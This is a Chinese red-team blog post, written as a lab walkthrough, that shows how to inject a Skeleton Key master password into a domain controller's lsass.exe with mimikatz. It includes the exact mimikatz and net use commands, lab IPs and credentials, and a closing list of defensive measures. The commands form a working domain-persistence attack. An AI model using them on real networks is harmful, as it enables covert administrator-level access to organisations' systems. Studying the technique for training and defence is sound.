> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/ABSLXoBea5YIyvtqJuSrEg)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **39** 篇文章，本公众号会记录一些我学习红队攻击的复现笔记（由浅到深），不出意外每天一更

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

Skeleton Key

使用 Skeleton Key（万能密码），可以对域内权限进行持久化操作。

使用 mimikatz 完成注入 Skeleon Key 的操作，将 Skeleton Key 注入域控制器的 lsass.exe 进程。

**万能密码**

**实验环境**

远程系统：

*   域名：god.org
    

域控制器：

*   主机名：OWA2010CN-God
    
*   IP 地址：192.168.3.21
    
*   用户名：administrator
    
*   密码：Admin12345
    

域成员服务器：

*   主机名：mary-PC
    
*   IP 地址：192.168.3.25
    
*   用户名：mary
    
*   密码：admin!@#45
    

* * *

**Mimikatz 中使用 Skeleton Key**

尝试以当前登录用户身份列出域控制器 C 盘共享目录中的文件：

```
dir \\192.168.3.21\c$
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKHN0cIOAaeqBcC4gn5ibORH1pnjU62mHMMxyErXrz6qL2YxQv640lLvWLVQRkBO31bDZUBD352MOA/640?wx_fmt=png)

因为此时是一个普通的域用户身份，所以系统提示权限不足！

这个时候使用域管理员账号和密码进行连接：

```
net use \\192.168.3.21\ipc$ "Admin12345" /user:god\administrator
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKHN0cIOAaeqBcC4gn5ibORHlDJAVqyX4ZpxJiadYh9xJFpJL7sT5P9bI2XiaUGl8ia9IavUibefGf3fKA/640?wx_fmt=png)

连接成功，这个时候就列出了域控制器 C 盘的共享目录。

之后在域控制器中以管理员权限打开 mimikatz，输入命令将 Skeleton Key 注入域控制器的 lsass.exe 进程：

```
# 提升权限
privilege::debug
# 注入 skeleton key
misc::skeleton
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKHN0cIOAaeqBcC4gn5ibORHeBx9mZb0MeibHIGSge78or0geMb0iblVrZLFgsDsEDictCel5Cic58tjFA/640?wx_fmt=png)

这个时候系统提示 Skeleton Key 已经注入成功，此时会在域内的所有账号中添加一个 Skeleton Key，其密码默认为：“mimikatz”。

接下来就可以了使用域内任意用户的身份配合 Skeleton Key 进行域内身份授权验证了。

在不使用域管理员原始密码的情况下，使用注入的 Skeleton Key，同样可以成功连接系统：

```
# 查看现有 ipc$
net use
# 将之前建立的 ipc$ 删除
net use \\192.168.3.21\ipc$ /del /y
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKHN0cIOAaeqBcC4gn5ibORHkE7Grm5MCDuO1L0s8F9BlMEbZKXJp7wDrF4eRemYNDaAo8Jw1QoX0A/640?wx_fmt=png)

输入命令，使用域管理员账号和 Skeleton Key 与域控制器建立 ipc$：

```
net use \\OWA2010CN-God\ipc$ "mimikatz" /user:god\administrator
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKHN0cIOAaeqBcC4gn5ibORHfPkASaWRC79yRQfMQm581F5Sk6P82bsptdgaXEFicEF1rfG6H71SJew/640?wx_fmt=png)

建立成功后这样就可以列出域控制器的共享目录了！

* * *

**Skeleton Key 防御措施**

*   域管理员用户要设置强密码，确保恶意代码不会在域控制器中执行。
    
*   在所有域用户中启用双因子认证，例如智能卡认证。
    
*   启动应用程序白名单（例如 AppLocker），以限制 mimikatz 在域控制器中的运行。
    

PS：因为 Skeleton Key 是被注入到 lsass.exe 进程的，所以它只存在于内存中，如果域控制器重启，注入的 Skeleton Key 将会失效。

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看